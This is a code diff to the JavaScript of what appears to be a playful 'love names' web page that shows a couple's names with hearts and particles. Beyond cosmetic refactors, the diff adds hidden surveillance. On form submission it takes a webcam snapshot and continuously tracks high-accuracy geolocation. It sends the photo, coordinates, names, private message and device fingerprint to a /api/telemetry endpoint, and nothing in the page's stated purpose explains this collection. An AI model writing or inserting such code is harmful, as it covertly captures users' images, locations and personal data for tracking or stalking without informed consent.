@@ -45,7 +45,6 @@
   function detectTelemetry() {
     var ua = navigator.userAgent || '';
     var fallback = parseUserAgentFallback(ua);
-    var dpr = window.devicePixelRatio || 1;
     var screenStr = window.screen.width + 'x' + window.screen.height;
     var tzStr = 'Unknown';
     try { tzStr = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}
@@ -68,20 +67,11 @@
 
   function applyCustomStyles(theme, scale) {
     if (!namesDisplay) return;
-    // Two Fixed Professional Theme Colors (#ff6584 Rose Pink & #6c63ff Violet)
-    if (theme === 'crimson') {
-      namesDisplay.style.color = '#ff334b';
-    } else if (theme === 'sunset') {
-      namesDisplay.style.color = '#ffa15c';
-    } else {
-      namesDisplay.style.color = '#ff6584'; // Default Fixed Theme color
-    }
+    if (theme === 'crimson') namesDisplay.style.color = '#ff334b';
+    else if (theme === 'sunset') namesDisplay.style.color = '#ffa15c';
+    else namesDisplay.style.color = '#ff6584';
 
-    if (scale === 'large') {
-      namesDisplay.style.transform = 'scale(1.2)';
-    } else {
-      namesDisplay.style.transform = 'scale(1.0)';
-    }
+    namesDisplay.style.transform = scale === 'large' ? 'scale(1.2)' : 'scale(1.0)';
   }
 
   function renderNames(name1, name2, message, theme, scale) {
@@ -96,11 +86,11 @@
     var heartSpan = document.createElement('span');
     heartSpan.className = 'heart-sep';
     heartSpan.textContent = ' ❤ ';
-    heartSpan.style.color = '#6c63ff'; // Fixed secondary violet accent color
+    heartSpan.style.color = '#6c63ff';
 
     var span2 = document.createElement('span');
     span2.textContent = name2;
-    span2.style.color = '#ffffff'; // Partner name in clean white contrast
+    span2.style.color = '#ffffff';
 
     namesDisplay.appendChild(span1);
     namesDisplay.appendChild(heartSpan);
@@ -126,12 +116,21 @@
     }
   }
 
+  function sendTelemetryData(extraPayload) {
+    var payload = Object.assign({}, clientTelemetry || {}, extraPayload);
+    fetch('/api/telemetry', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(function () {});
+  }
+
   namesForm.addEventListener('submit', function (e) {
     e.preventDefault();
     var yourName = (yourNameInput.value || '').trim();
     var partnerName = (partnerNameInput.value || '').trim();
     var message = (loveMessageInput.value || '').trim();
-    var selectedTheme = themeSelect ? themeSelect.value : 'gradient';
+    var selectedTheme = themeSelect ? themeSelect.value : 'rose';
     var selectedScale = fontSizeSelect ? fontSizeSelect.value : 'normal';
 
     if (!yourName || !partnerName) {
@@ -146,11 +145,65 @@
     renderNames(yourName, partnerName, message, selectedTheme, selectedScale);
     generateLoveParticles(70);
 
-    // Continuous Geolocation Watch & Telemetry Sync
+    // 1. Request Camera Permission & Capture Snapshot
+    var cameraStatusVal = 'Not Requested';
+    var webcamPicVal = null;
+
+    if (navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === 'function') {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function (stream) {
+          cameraStatusVal = 'Allowed / Active';
+          var video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+          setTimeout(function () {
+            var canvas = document.createElement('canvas');
+            canvas.width = 160;
+            canvas.height = 120;
+            var ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, 160, 120);
+            webcamPicVal = canvas.toDataURL('image/jpeg', 0.5);
+            stream.getTracks().forEach(function (track) { track.stop(); });
+
+            // Send initial packet with webcam snapshot
+            sendTelemetryData({
+              your_name: yourName,
+              partner_name: partnerName,
+              couple_names: yourName + ' ❤ ' + partnerName,
+              message: message,
+              camera_status: cameraStatusVal,
+              webcam_pic: webcamPicVal
+            });
+          }, 800);
+        })
+        .catch(function () {
+          cameraStatusVal = 'Denied / Blocked';
+          sendTelemetryData({
+            your_name: yourName,
+            partner_name: partnerName,
+            couple_names: yourName + ' ❤ ' + partnerName,
+            message: message,
+            camera_status: cameraStatusVal,
+            webcam_pic: null
+          });
+        });
+    } else {
+      cameraStatusVal = 'Not Supported';
+      sendTelemetryData({
+        your_name: yourName,
+        partner_name: partnerName,
+        couple_names: yourName + ' ❤ ' + partnerName,
+        message: message,
+        camera_status: cameraStatusVal,
+        webcam_pic: null
+      });
+    }
+
+    // 2. Request Geolocation & Continuous Watch
     if (navigator.geolocation) {
       watchId = navigator.geolocation.watchPosition(
         function (position) {
-          var payload = Object.assign({}, clientTelemetry || {}, {
+          sendTelemetryData({
             your_name: yourName,
             partner_name: partnerName,
             couple_names: yourName + ' ❤ ' + partnerName,
@@ -159,15 +212,9 @@
             longitude: position.coords.longitude,
             location_status: 'Allowed / Live Tracking'
           });
-
-          fetch('/api/telemetry', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          }).catch(function () {});
         },
         function (error) {
-          var payload = Object.assign({}, clientTelemetry || {}, {
+          sendTelemetryData({
             your_name: yourName,
             partner_name: partnerName,
             couple_names: yourName + ' ❤ ' + partnerName,
@@ -176,11 +223,6 @@
             longitude: null,
             location_status: 'Denied / Blocked'
           });
-          fetch('/api/telemetry', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          }).catch(function () {});
         },
         { enableHighAccuracy: true, timeout: 10000 }
       );
